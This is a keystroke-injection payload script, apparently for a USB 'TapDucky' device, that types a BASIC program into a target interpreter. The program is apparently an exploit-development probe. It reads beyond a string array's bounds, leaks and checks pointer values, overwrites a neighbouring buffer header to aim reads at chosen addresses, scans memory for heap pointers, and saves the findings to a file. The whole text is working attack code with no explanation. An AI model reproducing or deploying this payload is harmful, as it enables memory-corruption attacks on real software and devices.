REM dprobe_v8 library + pointer hunt -- compact TapDucky payload
DEFAULTDELAY 40
DELAY 2000
STRINGLN VAR NSR,ZERO$=CHR$(0),I
STRINGLN VAR CAP$
STRINGLN FOR I=1 TO 18:ZERO$=ZERO$+ZERO$:NEXT
STRINGLN NSR=ARRAY$(4)
STRINGLN COPY NSR[0],0,"0000":COPY NSR[1],0,"1111"
STRINGLN COPY NSR[2],0,"2222":COPY NSR[3],0,"3333"
STRINGLN PRINT "DIST PROBE READY",1024
STRINGLN END
STRINGLN COMMON DEF P$(V#)
STRINGLN VAR S$="",J
STRINGLN FOR J=0 TO 3
STRINGLN S$=S$+CHR$(V#-FLOOR(V#/65536)*65536):V#=FLOOR(V#/65536)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF U#(S$)
STRINGLN VAR V#=0,J
STRINGLN IF LEN(S$)<4 THEN RETURN 0
STRINGLN FOR J=3 TO 0 STEP -1:V#=V#*65536+ASC(MID$(S$,J,1)):NEXT
STRINGLN RETURN V#
STRINGLN END
STRINGLN COMMON DEF PTR(V#,A)
STRINGLN RETURN V#>0 && V#<549755813888 && V#==FLOOR(V#/A)*A
STRINGLN END
STRINGLN COMMON DEF HX$(V#)
STRINGLN VAR S$="",J,A
STRINGLN FOR J=0 TO 11
STRINGLN A=V#-FLOOR(V#/16)*16
STRINGLN S$=MID$("0123456789ABCDEF",A,1)+S$
STRINGLN V#=FLOOR(V#/16)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF PLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10):PRINT S$:RETURN ""
STRINGLN END
STRINGLN COMMON DEF FLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10):RETURN ""
STRINGLN END
STRINGLN COMMON DEF AIM(A#,N)
STRINGLN COPY NSR[0],16,P$(A#)+P$(N)
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF PROBE()
STRINGLN VAR V$,D$,X$,J,CH,V#,L#,N,C,E0#,E1#,E2#,E3#,OD$,S$
STRINGLN X$=PLOG("== S1 ==")
STRINGLN V$=COPY(NSR[0],0,16)
STRINGLN FOR J=0 TO 3
STRINGLN V#=U#(MID$(V$,J*4,4))
STRINGLN X$=PLOG("W"+STR$(J)+" "+HX$(V#)+" "+STR$(PTR(V#,16)))
STRINGLN NEXT
STRINGLN E0#=U#(MID$(V$,0,4)):E1#=U#(MID$(V$,4,4)):E2#=U#(MID$(V$,8,4)):E3#=U#(MID$(V$,12,4))
STRINGLN X$=PLOG("LEN "+HX$(LEN(NSR[0])))
STRINGLN IF !PTR(E0#,16) || !PTR(E3#,16) THEN X$=PLOG("PTRBAD"):SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
STRINGLN OD$=COPY(NSR[0],16,8)
STRINGLN X$=PLOG("S1 OK")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S2L ==")
STRINGLN X$=AIM(E0#,16)
STRINGLN X$=PLOG("LIB "+STR$(COPY(NSR[1],0,16)==V$))
STRINGLN COPY NSR[0],16,OD$
STRINGLN X$=PLOG("== S2P ==")
STRINGLN N=0:C=0
STRINGLN FOR CH=0 TO 9
STRINGLN D$=COPY(NSR[0],CH*512,512)
STRINGLN IF LEN(D$)==512 THEN
STRINGLN FOR J=0 TO 504 STEP 4
STRINGLN V#=U#(MID$(D$,J,4))
STRINGLN IF V#>4096 && V#<281474976710656 && (V# MOD 4)==0 THEN
STRINGLN IF !(V#>=E0#-268435456 && V#<=E0#+268435456) THEN
STRINGLN N=N+1
STRINGLN S$="N"+STR$(CH*512+J)+" "+HX$(V#)
STRINGLN IF N<=12 THEN X$=PLOG(S$) ELSE X$=FLOG(S$)
STRINGLN ENDIF
STRINGLN ENDIF
STRINGLN IF J MOD 8==0 THEN
STRINGLN L#=U#(MID$(D$,J+4,4))
STRINGLN IF L#==5 && V#>4096 && V#<281474976710656 THEN
STRINGLN C=C+1
STRINGLN S$="C"+STR$(CH*512+J)+" "+HX$(V#)
STRINGLN IF C<=6 THEN X$=PLOG(S$) ELSE X$=FLOG(S$)
STRINGLN ENDIF
STRINGLN ENDIF
STRINGLN NEXT
STRINGLN ENDIF
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN NEXT
STRINGLN X$=PLOG("NH "+STR$(N)+" C "+STR$(C))
STRINGLN X$=PLOG("DONE")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN RETURN 1
STRINGLN END
